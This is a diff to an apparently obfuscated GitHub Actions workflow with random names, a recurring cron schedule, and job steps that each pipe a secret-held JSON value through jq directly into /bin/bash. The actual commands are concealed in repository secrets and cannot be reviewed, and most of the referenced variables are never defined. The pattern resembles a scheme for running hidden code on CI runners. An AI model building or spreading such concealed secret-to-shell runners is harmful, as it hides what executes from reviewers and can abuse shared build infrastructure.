@@ -1,9 +1,9 @@
 name: xiaodafeng3216
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 4/6 * * *'
-
+    - cron: '55 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: xiaodafeng3216
         env:
-          zflw80166: ${{ secrets.zflw80166 }}
+          ji39512: ${{ secrets.ji39512 }}
         run: |
-          echo $zflw80166 | jq -r .ddq423 | /bin/bash
-          echo $t1430 | jq -r .wh0 | /bin/bash
-          echo $qhh70902 | jq -r .vki9334 | /bin/bash
-          echo $e5 | jq -r .wlcq1322 | /bin/bash
-          echo $gl5606 | jq -r .nprhe31 | /bin/bash
-          echo $o6748 | jq -r .j58478 | /bin/bash
-          echo $y4249 | jq -r .f36184 | /bin/bash
-          echo $vwp84 | jq -r .n19184 | /bin/bash
-          echo $c7 | jq -r .catnt34499 | /bin/bash
-          echo $ovns39 | jq -r .dcxx710 | /bin/bash
-          echo $bivm78237 | jq -r .vlax02 | /bin/bash
-          echo $vztt67364 | jq -r .f2 | /bin/bash
+          echo $ji39512 | jq -r .kqwfu5664 | /bin/bash
+          echo $fr510 | jq -r .vps9 | /bin/bash
+          echo $itm5502 | jq -r .c7231 | /bin/bash
+          echo $kiqxx6117 | jq -r .eryja8 | /bin/bash
+          echo $xd13 | jq -r .pimb2 | /bin/bash
+          echo $uh53 | jq -r .wmq13 | /bin/bash
+          echo $gxm9103 | jq -r .mdref049 | /bin/bash
+          echo $z94985 | jq -r .afqc78923 | /bin/bash
+          echo $kwdt150 | jq -r .z6365 | /bin/bash
+          echo $i9 | jq -r .mx9846 | /bin/bash
+          echo $suw1881 | jq -r .aavci10573 | /bin/bash
 
